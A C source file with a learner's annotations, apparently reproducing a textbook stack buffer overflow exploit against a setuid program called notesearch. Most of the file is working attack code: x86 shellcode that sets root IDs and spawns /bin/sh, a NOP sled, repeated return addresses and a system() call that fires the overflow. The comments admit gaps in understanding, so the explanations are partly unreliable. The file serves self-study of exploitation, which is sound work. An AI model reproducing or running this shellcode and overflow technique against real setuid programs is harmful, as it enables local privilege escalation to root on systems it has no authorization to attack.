/*
 Author:    Lemur
 Email:     1emvr@protonmail.com
 Date:      12/19/2022  09:25 AM

 An excerpt taken from the book "Hacking: The Art of Exploitation, Vol 2"

 I do not fully understand the calculation of bytes/sizes.
 I only understand the basic concepts but I will continue
 to analyze to the best of my ability and continue to
 correct mistakes where I make them.

 These are really just notes to keep
 track of my progress over time.

 If my comments/analysis are incorrect,
 please feel free to give any corrections, suggestions or pointers
 that you might have. I do not respond poorly to criticism 
 and It's all very much appreciated

 <3

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

char shellcode[] =
/*
    This is our shellcode. I have no idea what it's saying but it will be
    passed to our main() function at some point and copied to our memory buffer.
*/

"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";

int main(int argc, char *argv[]) {
/*
    In the main() function we set up an iterator (i), a "pointer" (never used),
    a return handler and an offset with a value of 270 bytes. We also set up a
    command pointer and buffer pointer.

    We allocate 200 bytes of memory to the "command" variable then flush it.
    We then copy the command to execute to the "command" variable
    and set one single quote to begin our input line.

    If we passed cli argument-data, we will convert ASCII to integer
    and pass it as the "offset". We then set "return" to use uint @i, minus the offset.

    While we iterate through i => 160 (no idea where they got the number) we create a pointer
    from "buffer + i" while casting the "uint" type to it since there's not "atoui" method that
    I know of. We then set them to the value of "return".

    We set buffer to contain 60 "NOP" codes (a "sled"), then copy our shellcode, plus 60 bytes
    to the buffer subratcting one byte, finally ending the line with the second single quote
    and running as a system command.
*/

    unsigned int i, *pointer, ret, offset = 270;
    char *command, *buffer;

    command = (char *) malloc(200);
    bzero(command, 200);

    strcpy(command, "./notesearch \'");
    buffer = command + strlen(command);

    if(argc > 1)
        offset = atoi(argv[1]);

    ret = (unsigned int) &i - offset;

    for(i = 0; i < 160; i += 4)
        *((unsigned int *)(buffer + i)) = ret;

    memset(buffer, 0x90, 60);
    memcpy(buffer + 60, shellcode, sizeof(shellcode) - 1);

    strcat(command, "\'");
    system(command);

    free(command);
}
